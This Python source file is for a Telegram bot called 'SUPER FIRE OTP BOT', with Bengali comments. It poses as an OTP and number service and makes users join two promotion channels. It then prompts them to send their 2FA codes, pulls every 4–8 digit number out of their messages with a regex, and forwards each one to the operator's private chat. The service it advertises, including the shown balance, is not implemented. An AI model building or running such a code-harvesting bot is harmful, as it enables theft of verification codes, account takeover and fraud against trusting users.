import logging
import re
import json
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
YOUR_CHAT_ID = int(os.getenv("YOUR_CHAT_ID"))

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')
DATA_FILE = "authorized_users.json"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def load_authorized_users():
    try:
        with open(DATA_FILE, 'r') as f:
            return set(json.load(f))
    except:
        return set()

def save_authorized_users(users):
    with open(DATA_FILE, 'w') as f:
        json.dump(list(users), f, indent=2)

authorized_users = load_authorized_users()

# সবসময় দেখানোর জন্য মেইন কিবোর্ড
def get_main_menu_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🎲 GET NUMBER"), KeyboardButton("🔐 2FA CODE")]
    ], resize_keyboard=True, persistent=True, is_persistent=True)

def get_join_keyboard():
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/EASY_MARKETING1")],
        [InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/EASY_METHOD1")],
        [InlineKeyboardButton("✅ Verify", callback_data="verify_user")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in authorized_users:
        await update.message.reply_text(
            "✨ **SUPER FIRE OTP BOT** ✨\n💰 Balance: 0.0 BDT",
            reply_markup=get_main_menu_keyboard(),
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            "🔒 চ্যানেলে জয়েন করে Verify করুন",
            reply_markup=get_join_keyboard(),
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "verify_user":
        authorized_users.add(user_id)
        save_authorized_users(authorized_users)
        
        try:
            await query.message.delete()
        except:
            pass

        await context.bot.send_message(
            chat_id=user_id,
            text="✅ **ভেরিফাই সফল!**\n\nএখন থেকে বট ব্যবহার করতে পারবেন।",
            reply_markup=get_main_menu_keyboard()
        )

    # অন্যান্য বাটনের জন্যও মেইন কিবোর্ড দেখাবে
    else:
        await query.message.reply_text("অপশন সিলেক্ট হয়েছে।", reply_markup=get_main_menu_keyboard())

async def handle_message(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    user_id = update.effective_user.id

    if user_id not in authorized_users:
        await update.message.reply_text("🔒 প্রথমে Verify করুন।", reply_markup=get_join_keyboard())
        return

    if text == "🎲 GET NUMBER":
        await update.message.reply_text("🔍 সার্ভিস সিলেক্ট করুন:", reply_markup=get_main_menu_keyboard())
    elif text == "🔐 2FA CODE":
        await update.message.reply_text("🔐 2FA কোড পাঠান:", reply_markup=get_main_menu_keyboard())
    else:
        otps = OTP_PATTERN.findall(text)
        if otps:
            for otp in otps:
                alert = f"🔥 OTP DETECTED: `{otp}`"
                await context.bot.send_message(YOUR_CHAT_ID, alert, parse_mode=ParseMode.MARKDOWN)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 BOT চালু হয়েছে...")
    app.run_polling()

if __name__ == '__main__':
    main()
